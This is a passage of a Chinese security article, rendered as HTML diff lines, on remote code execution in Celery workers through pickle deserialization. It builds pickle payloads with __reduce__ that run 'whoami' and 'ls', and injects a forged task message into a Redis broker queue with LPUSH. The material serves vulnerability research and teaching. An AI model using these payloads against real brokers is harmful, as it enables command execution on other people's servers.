+        <span class="k"><span class="hljs-keyword">return</span></span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s"><span class="hljs-string">'whoami'</span></span><span class="p">,</span> <span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">CMD</span><span class="p">())))</span>
+</code></pre>
+</div>
+<p>运行得到编码后的序列化数据：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs ini"><span class="hljs-setting">Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg=<span class="hljs-value">=</span></span>
+</code></pre>
+</div>
+<p>这里需要主要的是 <code class="highlighter-rouge">os.system('whoami')</code> 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs bash">➜  demo <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg=="</span> | base64 -D | xxd
+<span class="hljs-number">0000000</span>: <span class="hljs-number">6370</span> <span class="hljs-number">6</span>f73 <span class="hljs-number">6978</span> <span class="hljs-number">0</span>a73 <span class="hljs-number">7973</span> <span class="hljs-number">7465</span> <span class="hljs-number">6</span>d0a <span class="hljs-number">7030</span>  cposix.system.p0
+<span class="hljs-number">0000010</span>: <span class="hljs-number">0</span>a28 <span class="hljs-number">5327</span> <span class="hljs-number">7768</span> <span class="hljs-number">6</span>f61 <span class="hljs-number">6</span>d69 <span class="hljs-number">270</span>a <span class="hljs-number">7031</span> <span class="hljs-number">0</span>a74  .(S<span class="hljs-string">'whoami'</span>.p1.t
+<span class="hljs-number">0000020</span>: <span class="hljs-number">7032</span> <span class="hljs-number">0</span>a52 <span class="hljs-number">7033</span> <span class="hljs-number">0</span>a2e                      p2.Rp3..
+➜  demo
+</code></pre>
+</div>
+<p>数据都是以 Python <code class="highlighter-rouge">pickle</code> 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。</p>
+<p>对上面的序列化数据使用 <code class="highlighter-rouge">unserializer.py</code> 进行反序列化操作时，会触发类重构操作，从而执行 <code class="highlighter-rouge">os.system('whoami')</code>：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle4.png"><img class="alignnone size-large wp-image-52164" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle4-1024x115.png" alt="pickle4" width="1024" height="115" /></a></p>
+<p>历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 <code class="highlighter-rouge">pickle</code> 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 <code class="highlighter-rouge">--pickled-options</code> 运行参数就可以传入由 <code class="highlighter-rouge">pickle</code> 模块序列化后的数据。虽然官方有对 <code class="highlighter-rouge">pickle</code> 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。</p>
+<h2 id="celery">二、分布式框架 Celery</h2>
+<p>回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。</p>
+<h4 id="section-1"><span style="color: #ff6600;">1. 使用框架进行简单的任务下发</span></h4>
+<p>Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># celery_simple.py</span></span>
+<span class="kn"><span class="hljs-keyword">from</span></span> <span class="nn">celery</span> <span class="kn"><span class="hljs-keyword">import</span></span> <span class="n">Celery</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span><span class="s"><span class="hljs-string">'demo'</span></span><span class="p">,</span> <span class="n">broker</span><span class="o">=</span><span class="s"><span class="hljs-string">'amqp://192.168.99.100//'</span></span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="s"><span class="hljs-string">'amqp://192.168.99.100//'</span></span><span class="p">)</span>
+<span class="nd"><span class="hljs-decorator">@app.task</span></span>
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">add</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span> <span class="n"><span class="hljs-function"><span class="hljs-params">y</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
+</code></pre>
+</div>
+<p>Celery 推荐使用 RabbitMQ 作为 Broker，这里直接在 <code class="highlighter-rouge">192.168.99.100</code> 主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs nginx"><span class="hljs-title">celery</span> worker -A celery_simple.app -l DEBUG
+</code></pre>
+</div>
+<p>然后另起一个 ipython 导入 <code class="highlighter-rouge">celery_simple</code> 模块中的 <code class="highlighter-rouge">add()</code> 函数，对其进行调用并获取结果：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs cpp">In [<span class="hljs-number">1</span>]: from celery_simple import add
+In [<span class="hljs-number">2</span>]: task = add.apply_async((<span class="hljs-number">4</span>, <span class="hljs-number">5</span>))
+In [<span class="hljs-number">3</span>]: task.result
+Out[<span class="hljs-number">3</span>]: <span class="hljs-number">9</span>
+</code></pre>
+</div>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle5.png"><img class="alignnone size-large wp-image-52165" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle5-1024x382.png" alt="pickle5" width="1024" height="382" /></a></p>
+<h4 id="section-2"><span style="color: #ff6600;">2. 框架中的消息封装方式</span></h4>
+<p>本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：</p>
+<ul>
+<li><strong>pickle</strong></li>
+<li>json</li>
+<li>msgpack</li>
+<li>yaml</li>
+<li>…</li>
+</ul>
+<p>可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。</p>
+<p>为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># celery_simple.py</span></span>
+<span class="kn"><span class="hljs-keyword">from</span></span> <span class="nn">celery</span> <span class="kn"><span class="hljs-keyword">import</span></span> <span class="n">Celery</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span><span class="s"><span class="hljs-string">'demo'</span></span><span class="p">,</span> <span class="n">broker</span><span class="o">=</span><span class="s"><span class="hljs-string">'redis://:@192.168.99.100:6379/0'</span></span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="s"><span class="hljs-string">'redis://:@192.168.99.100:6379/0'</span></span><span class="p">)</span>
+<span class="nd"><span class="hljs-decorator">@app.task</span></span>
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">add</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span> <span class="n"><span class="hljs-function"><span class="hljs-params">y</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
+</code></pre>
+</div>
+<p>这里先不起 worker 进程，直接使用 ipython 进行任务下发：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs cpp">In [<span class="hljs-number">1</span>]: from celery_simple import add
+In [<span class="hljs-number">2</span>]: task = add.apply_async((<span class="hljs-number">4</span>, <span class="hljs-number">9</span>))
+</code></pre>
+</div>
+<p>这时候查看 Redis 里面的数据：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle6.png"><img class="alignnone size-large wp-image-52166" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle6-1024x142.png" alt="pickle6" width="1024" height="142" /></a></p>
+<p>可以看到 Redis 里面存在两个键，<code class="highlighter-rouge">celery</code> 和 <code class="highlighter-rouge">_kombu.binding.celery</code>，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 <code class="highlighter-rouge">add()</code> 函数由于没有进行特别的设置，所以其所处的消息队列为名为 <code class="highlighter-rouge">celery</code> 的队列，<code class="highlighter-rouge">exchange</code> 和 <code class="highlighter-rouge">routing_key</code> 值都为 <code class="highlighter-rouge">celery</code>，所有满足路由（<code class="highlighter-rouge"><span class="p">{</span><span class="nt">"queue"</span><span class="p">:</span><span class="s2">"celery"</span><span class="p">,</span><span class="nt">"exchange"</span><span class="p">:</span><span class="s2">"celery"</span><span class="p">,</span><span class="nt">"routing_key"</span><span class="p">:</span><span class="s2">"celery"</span><span class="p">}</span></code>）的消息都会发到该 worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。</p>
+<p>而刚刚提到的 Reids 中的键 <code class="highlighter-rouge">_kombu.binding.celery</code> 表示存在一个名为 <code class="highlighter-rouge">celery</code> 的队列，其 <code class="highlighter-rouge">exchange</code>和 <code class="highlighter-rouge">routing_key</code> 的信息保存在该集合里：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle7.png"><img class="alignnone size-large wp-image-52167" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle7-1024x56.png" alt="pickle7" width="1024" height="56" /></a></p>
+<p>而键 <code class="highlighter-rouge">celery</code> 里面存储的就是每一个 push 到队列里面的具体消息信息：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle8.png"><img class="alignnone size-large wp-image-52168" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle8-1024x176.png" alt="pickle8" width="1024" height="176" /></a></p>
+<p>可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：</p>
+<div class="language-json highlighter-rouge">
+<pre class="highlight"><code class="hljs json"><span class="p">{</span>
+    <span class="nt">"<span class="hljs-attribute">body</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">headers</span>"</span><span class="p">:</span> <span class="p"><span class="hljs-value">{}</span>,</span>
+    <span class="nt">"<span class="hljs-attribute">content-encoding</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"binary"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">content-type</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"application/x-python-serialize"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">properties</span>"</span><span class="p">:</span> <span class="p"><span class="hljs-value">{</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">body_encoding</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"base64"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">reply_to</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">correlation_id</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_info</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="p"><span class="hljs-value"><span class="hljs-value">{</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">routing_key</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"celery"</span></span></span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">,</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">exchange</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"celery"</span></span></span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">,</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">priority</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="mi"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-number">0</span></span></span></span></span>
+        <span class="p"><span class="hljs-value"><span class="hljs-value">}</span>,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_mode</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="mi"><span class="hljs-value"><span class="hljs-value"><span class="hljs-number">2</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_tag</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span></span></span>
+    <span class="p"><span class="hljs-value">}</span></span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>在上面的消息数据中，<code class="highlighter-rouge">properties</code> 里包含了消息的路由信息和标识性的 UUID 值，而其中<code class="highlighter-rouge">properties.body_encoding</code> 的值则表示消息主体 <code class="highlighter-rouge">body</code> 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 <code class="highlighter-rouge">properties.body_encoding</code> 的值对消息主体 <code class="highlighter-rouge">body</code> 进行解码，即 <code class="highlighter-rouge">base64.b64decode(body)</code>，而消息数据中的 <code class="highlighter-rouge">content-type</code> 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 <code class="highlighter-rouge">pickle</code> 对任务数据进行的序列化。</p>
+<p>将消息主体经 base64 解码和反序列化（即之前 <code class="highlighter-rouge">unserializer.py</code> 文件功能） 操作以后得到具体的任务数据：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle9.png"><img class="alignnone size-large wp-image-52169" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle9-1024x143.png" alt="pickle9" width="1024" height="143" /></a></p>
+<p>格式化任务数据为：</p>
+<div class="language-json highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="p">{</span>
+    <span class="err"><span class="hljs-string">'args'</span>:</span> <span class="err">(<span class="hljs-number">4</span>,</span> <span class="err"><span class="hljs-number">9</span>),</span>  <span class="err">//</span> <span class="err">传递进</span> <span class="err">celery_simple.add</span> <span class="err">函数中的参数</span>
+    <span class="err"><span class="hljs-string">'timelimit'</span>:</span> <span class="err">(<span class="hljs-keyword">None</span>,</span> <span class="err"><span class="hljs-keyword">None</span>),</span>  <span class="err">//</span> <span class="err">celery</span> <span class="err">Task</span> <span class="err">任务执行时间限制</span>
+    <span class="err"><span class="hljs-string">'expires'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>
+    <span class="err"><span class="hljs-string">'taskset'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>
+    <span class="err"><span class="hljs-string">'kwargs'</span>:</span> <span class="err">{</span><span class="p">}</span><span class="err">,</span>
+    <span class="err"><span class="hljs-string">'retries'</span>:</span> <span class="mi"><span class="hljs-number">0</span></span><span class="err">,</span>
+    <span class="err"><span class="hljs-string">'callbacks'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>  <span class="err">//</span> <span class="err">Task</span> <span class="err">任务回调</span>
+    <span class="err"><span class="hljs-string">'chord'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>
+    <span class="err"><span class="hljs-string">'id'</span>:</span> <span class="err"><span class="hljs-string">'</span></span><span class="mi"><span class="hljs-string">1</span></span><span class="err"><span class="hljs-string">d</span></span><span class="mi"><span class="hljs-string">8</span></span><span class="err"><span class="hljs-string">fa</span></span><span class="mi"><span class="hljs-string">7</span></span><span class="err"><span class="hljs-string">ae</span></span><span class="mi"><span class="hljs-string">-12</span></span><span class="err"><span class="hljs-string">f</span></span><span class="mi"><span class="hljs-string">6-4229-9</span></span><span class="err"><span class="hljs-string">eb</span></span><span class="mi"><span class="hljs-string">9-99</span></span><span class="err"><span class="hljs-string">d</span></span><span class="mi"><span class="hljs-string">5</span></span><span class="err"><span class="hljs-string">bbb</span></span><span class="mi"><span class="hljs-string">9</span></span><span class="err"><span class="hljs-string">dabe'</span>,</span>  <span class="err">//</span> <span class="err">任务唯一</span> <span class="err">ID</span>
+    <span class="err"><span class="hljs-string">'eta'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>
+    <span class="err"><span class="hljs-string">'errbacks'</span>:</span> <span class="err"><span class="hljs-keyword">None</span>,</span>
+    <span class="err"><span class="hljs-string">'task'</span>:</span> <span class="err"><span class="hljs-string">'celery_simple.add'</span>,</span>  <span class="err">//</span> <span class="err">任务执行的具体方法</span>
+    <span class="err"><span class="hljs-string">'utc'</span>:</span> <span class="err"><span class="hljs-keyword">True</span></span>
+<span class="err">}</span>
+</code></pre>
+</div>
+<p>任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 <code class="highlighter-rouge">pickle</code> 对消息主体进行反序列化。</p>
+<h4 id="section-3"><span style="color: #ff6600;">3. 构造恶意消息数据</span></h4>
+<p>那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。</p>
+<p>这里直接对消息主体 <code class="highlighter-rouge">body</code> 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">base64</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">pickle</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">commands</span>
+<span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">LS</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="bp"><span class="hljs-function"><span class="hljs-params">self</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+        <span class="k"><span class="hljs-keyword">return</span></span> <span class="p">(</span><span class="n">commands</span><span class="o">.</span><span class="n">getstatusoutput</span><span class="p">,</span> <span class="p">(</span><span class="s"><span class="hljs-string">'ls'</span></span><span class="p">,</span> <span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">LS</span><span class="p">())))</span>
+</code></pre>
+</div>
+<p>运行程序生成具体 Payload 数据：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs nginx"><span class="hljs-title">Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou</span>
+</code></pre>
+</div>
+<p>使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：</p>
+<div class="language-json highlighter-rouge">
+<pre class="highlight"><code class="hljs json"><span class="p">{</span>
+    <span class="nt">"<span class="hljs-attribute">body</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">headers</span>"</span><span class="p">:</span> <span class="p"><span class="hljs-value">{}</span>,</span>
+    <span class="nt">"<span class="hljs-attribute">content-encoding</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"binary"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">content-type</span>"</span><span class="p">:</span> <span class="s2"><span class="hljs-value"><span class="hljs-string">"application/x-python-serialize"</span></span></span><span class="p">,</span>
+    <span class="nt">"<span class="hljs-attribute">properties</span>"</span><span class="p">:</span> <span class="p"><span class="hljs-value">{</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">body_encoding</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"base64"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">reply_to</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">correlation_id</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_info</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="p"><span class="hljs-value"><span class="hljs-value">{</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">routing_key</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"celery"</span></span></span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">,</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">exchange</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"celery"</span></span></span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">,</span></span></span>
+            <span class="nt"><span class="hljs-value"><span class="hljs-value">"<span class="hljs-attribute">priority</span>"</span></span></span><span class="p"><span class="hljs-value"><span class="hljs-value">:</span></span></span> <span class="mi"><span class="hljs-value"><span class="hljs-value"><span class="hljs-value"><span class="hljs-number">0</span></span></span></span></span>
+        <span class="p"><span class="hljs-value"><span class="hljs-value">}</span>,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_mode</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="mi"><span class="hljs-value"><span class="hljs-value"><span class="hljs-number">2</span></span></span></span><span class="p"><span class="hljs-value">,</span></span>
+        <span class="nt"><span class="hljs-value">"<span class="hljs-attribute">delivery_tag</span>"</span></span><span class="p"><span class="hljs-value">:</span></span> <span class="s2"><span class="hljs-value"><span class="hljs-value"><span class="hljs-string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span></span></span>
+    <span class="p"><span class="hljs-value">}</span></span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>将假消息通过 Redis 命令行直接添加到 <code class="highlighter-rouge">celery</code> 队列任务中：</p>
+<div class="language-bash highlighter-rouge">
+<pre class="highlight"><code class="hljs apache"><span class="gp"><span class="hljs-keyword">127</span>.0.0.1:6379&gt; </span>LPUSH celery <span class="s1">'{<span class="hljs-string">"body"</span>:<span class="hljs-string">"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"</span>,<span class="hljs-string">"headers"</span>:{},<span class="hljs-string">"content-encoding"</span>:<span class="hljs-string">"binary"</span>,<span class="hljs-string">"content-type"</span>:<span class="hljs-string">"application/x-python-serialize"</span>,<span class="hljs-string">"properties"</span>:{<span class="hljs-string">"body_encoding"</span>:<span class="hljs-string">"base64"</span>,<span class="hljs-string">"reply_to"</span>:<span class="hljs-string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,<span class="hljs-string">"correlation_id"</span>:<span class="hljs-string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,<span class="hljs-string">"delivery_info"</span>:{<span class="hljs-string">"routing_key"</span>:<span class="hljs-string">"celery"</span>,<span class="hljs-string">"exchange"</span>:<span class="hljs-string">"celery"</span>,<span class="hljs-string">"priority"</span>:0},<span class="hljs-string">"delivery_mode"</span>:2,<span class="hljs-string">"delivery_tag"</span>:<span class="hljs-string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span>}}'</span>
+</code></pre>
+</div>
+<p>查看一下 <code class="highlighter-rouge">celery</code> 队列中的消息情况：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle10.png"><img class="alignnone size-large wp-image-52170" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle10-1024x157.png" alt="pickle10" width="1024" height="157" /></a></p>
+<p>然后起一个 Celery worker 端加载之前的 <code class="highlighter-rouge">celery_simple.py</code> 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle11.png"><img class="alignnone size-large wp-image-52171" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle11-1024x138.png" alt="pickle11" width="1024" height="138" /></a></p>
+<p>worker 端经过 <code class="highlighter-rouge">pickle.loads(base64.b64decode(body))</code> 处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了 <code class="highlighter-rouge">pickle</code> 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。</p>
+<h2 id="broker-">三、利用脆弱的 Broker 代理进行分布式节点攻击</h2>
+<p>前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle12.png"><img class="alignnone size-large wp-image-52172" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle12-1024x427.png" alt="pickle12" width="1024" height="427" /></a></p>
+<h4 id="celery--broker-"><span style="color: #ff6600;">1. 检测 Celery 应用中 Broker 特征</span></h4>
+<p>那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。</p>
